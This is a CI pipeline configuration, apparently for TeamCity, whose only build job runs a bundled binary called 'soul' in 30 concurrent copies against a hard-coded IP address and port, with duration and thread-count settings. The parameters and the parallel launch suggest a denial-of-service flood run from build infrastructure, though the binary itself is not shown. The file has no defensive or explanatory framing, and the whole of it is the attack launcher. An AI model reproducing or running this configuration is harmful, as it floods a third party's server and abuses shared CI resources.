version: "2021.2"

buildTypes:
  - id: Run_Soul
    name: Run Soul Jobs

    params:
      IP: "20.235.53.164"
      PORT: "23628"
      TIME: "300"
      THREADS: "100"
      CONCURRENCY: "30"

    vcs:
      root: self

    steps:
      - script:
          name: Make soul executable
          scriptContent: |
            chmod +x ./soul

      - script:
          name: Run soul concurrently
          scriptContent: |
            echo "Starting $CONCURRENCY concurrent jobs..."
            for i in $(seq 1 $CONCURRENCY); do
              ./soul $IP $PORT $TIME $THREADS &
            done
            wait
